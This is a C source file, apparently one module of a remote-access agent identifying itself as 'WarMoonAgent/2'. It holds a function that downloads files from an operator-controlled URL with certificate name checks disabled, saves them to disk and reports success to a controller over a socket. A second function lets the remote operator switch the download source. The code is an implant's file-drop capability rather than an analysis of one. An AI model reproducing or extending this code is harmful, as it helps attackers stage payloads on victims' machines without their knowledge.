#include "Variables.h"

int Download(const char *FileToDownload)
{
	char Success[] = "\033[0;35m[+] Downloaded!\033[0m\n";

	if (Site[0] == 'X')
	{
		return EXIT_FAILURE;
	}

	HINTERNET Internet = InternetOpenA("WarMoonAgent/2", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (Internet == NULL)
	{
		return EXIT_FAILURE;
	}

	char FullURL[1024];
	memset(&FullURL, 0, sizeof(FullURL));
	snprintf(FullURL, sizeof(FullURL), "%s%s", Site, FileToDownload); //Creates the full URL

	HINTERNET URL = InternetOpenUrlA(Internet, FullURL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_RELOAD, 0);

	if (URL == NULL)
	{
		InternetCloseHandle(Internet);
		return EXIT_FAILURE;
	}

	FILE* file = fopen(FileToDownload, "wb");
	if (file == NULL)
	{
		InternetCloseHandle(URL);
		InternetCloseHandle(Internet);
		return EXIT_FAILURE;
	}

	char StoreData[4096];
	DWORD BytesRead = 0;
	BOOL Downloaded = 1;
	while (InternetReadFile(URL, StoreData, sizeof(StoreData), &BytesRead) && BytesRead != 0)
	{
		if (fwrite(StoreData, 1, BytesRead, file) != BytesRead)
		{
			Downloaded = 0;
			break;
		}
	}

	if (Downloaded != 1)
	{
		fclose(file);
		InternetCloseHandle(URL);
		InternetCloseHandle(Internet);
		return EXIT_FAILURE;
	}

	fclose(file);
	InternetCloseHandle(URL);
	InternetCloseHandle(Internet);
	send(sock, Success, sizeof(Success), 0);
	return EXIT_SUCCESS;
}

int UpdateURLDownload(const char *UpdatedURL)
{
	char Success[] = "\033[0;35m[+] Updated!\033[0m\n";
	char EntireURLToUse[1024];
	snprintf(EntireURLToUse, sizeof(EntireURLToUse), "%s", UpdatedURL);

	if (strlen(UpdatedURL) == 0)
	{
		return EXIT_FAILURE;
	}

	snprintf(Site, sizeof(Site), "%s", UpdatedURL);
	send(sock, Success, sizeof(Success), 0);
	return EXIT_SUCCESS;
}
